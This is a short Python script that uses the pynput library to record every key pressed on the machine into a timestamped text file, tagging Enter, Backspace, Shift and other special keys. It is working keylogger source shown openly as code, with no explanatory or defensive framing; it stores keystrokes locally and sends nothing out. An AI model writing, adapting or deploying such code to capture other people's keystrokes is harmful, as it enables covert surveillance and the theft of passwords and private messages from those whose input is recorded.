from pynput import keyboard
from datetime import datetime

log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def keyPressed(key):
	print(str(key))
	with open(log_file, "a") as logKey:
		try:
			char = key.char
			logKey.write(char)
		except:
			if key == key.space:
				logKey.write(' ')
			elif key == key.enter:
				logKey.write('[ENTER]\n')
			elif key == key.backspace:
				logKey.write('[BACKSPACE]')
			elif key == key.shift or key == key.shift_r:
				logKey.write('[SHIFT]')
			else:
				logKey.write(' [{0}] '.format(key))

listener = keyboard.Listener(on_press=keyPressed)
listener.start()
input()
